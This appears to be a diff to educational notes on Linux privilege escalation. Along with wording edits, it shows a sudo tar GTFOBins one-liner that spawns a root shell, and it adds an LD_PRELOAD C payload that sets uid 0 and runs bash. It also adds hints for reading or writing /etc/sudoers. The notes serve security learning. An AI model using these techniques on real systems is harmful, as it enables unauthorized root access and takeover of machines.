@@ -26,7 +26,7 @@ As there isn't much we can do as a regular user, we will try to elevate our leve
 * Find a vulnerability in the kernel
 * ...
 
-The **goal is to pop out a bash as root** (root bash), basically, the same as if the administrator used `sudo -s`.
+The **goal is to pop out a shell as root** (root shell), basically, the same as if the administrator used `sudo -s`.
 
 </div><div>
 
@@ -52,7 +52,7 @@ It's common for well-known Linux commands to be misconfigured. Vulnerabilities c
 > There is a local version of [gtfo in Python](https://github.com/t0thkr1s/gtfo) (96 ⭐, 2021).
 </div><div>
 
-Example: you can only run `tar` using `sudo`. Run the command below from [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo), and you will get a bash as root.
+Example: you can only run `tar` using `sudo`. Run the command below from [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo), and you will get a root shell.
 
 ```bash
 $ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
@@ -78,10 +78,11 @@ Aside from commands that are in the Linux notes, here are a few used in cybersec
 * `groups`: list groups
 * `uname -a`: info about the kernel
 * `hostname`: info about the host <small>(ex: `website-dev` -> role of the user)</small>
-* `ps -e`: see every running process
+* `ps -e` / `top`: see running process
 * `env`: see environment variables
 * `umask`: see the default perms on newly created files
 * `finger`: return a summary of information about a user
+* `find / -writable -type d 2>/dev/null`: find writable directories
 
 **Potentially vulnerable services** 💸
 
@@ -148,8 +149,23 @@ User [...] may run the following commands on [...]:
     (root) /bin/tar # see tar#sudo on GTFOBins
 ```
 
-It's possible for the administrator to only allow a command/multiple commands to be run as root by a user. This is the case with `tar` above. If you can see `ALL`, then you can run any command as root. 
+It's possible for the administrator to only allow a command/multiple commands to be run as root by a user. This is the case with `tar` above. If you can see `ALL`, then you can run any command as root.
 </div><div>
+
+With LD_PRELOAD ([see explanation](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)) and env_keep option set, you can create a root shell by compiling the following code with `gcc -shared -fPIC init.c -o init.so`
+
+```c
+void _init() {
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+
+```bash
+# running this will create a root shell
+$ LD_PRELOAD=/tmp/init.so tar
+```
 
 **sudo before 1.8.28 (CVE-2019-14287)**
 
@@ -219,6 +235,15 @@ $ cat /etc/shadow
 # (copy a password / generate one mkpasswd -m sha-512 toto)
 ```
 </div><div>
+
+If `/etc/sudoers` was <s>intentionally</s> misconfigured
+
+```bash
+$ cat /etc/sudoers
+# if you can read it: find users that will be useful to compromise
+# if you can write it: add yourself in
+# your_user    ALL=(ALL:ALL) ALL
+```
 
 Until 1979/Unix V7, passwords were stored in `/etc/passwd`, so a regular user could read them, and try brute-forcing the password.
 
@@ -396,7 +421,6 @@ Courses
 * [payatu.com](https://payatu.com/guide-linux-privilege-escalation)
 * [udemy.com](https://www.udemy.com/course/linux-privilege-escalation/)
 * [tbhaxor.com](https://tbhaxor.com/exploiting-suid-binaries-to-get-root-user-shell/) (SUID)
-* [rafalcieslak](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) (LD_PRELOAD)
 * [g0tmi1k.com](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 </div><div>
 </div></div>
